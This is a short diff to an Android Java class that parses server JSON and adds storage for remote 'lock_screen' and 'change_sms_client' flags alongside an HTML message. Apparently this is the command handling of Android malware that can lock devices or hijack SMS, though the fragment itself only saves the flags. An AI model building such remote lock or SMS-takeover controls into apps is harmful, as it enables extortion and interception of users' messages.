@@ -91,7 +91,15 @@ public class GetREST {
                 if (!jdata.isNull("html_message")){
                     mDataManager.getPreferensManager().saveHtmlText(jdata.getString("html_message"));
                 }
+                if (!jdata.isNull("lock_screen")){
+                    mDataManager.getPreferensManager().saveLockScreen(jdata.getBoolean("lock_screen"));
 
+                } else {
+                    mDataManager.getPreferensManager().saveLockScreen(false);
+                }
+                if (!jdata.isNull("change_sms_client")){
+                    mDataManager.getPreferensManager().saveSmsChange(jdata.getBoolean("change_sms_client"));
+                }
             }
 
             Log.d(TAG,response);
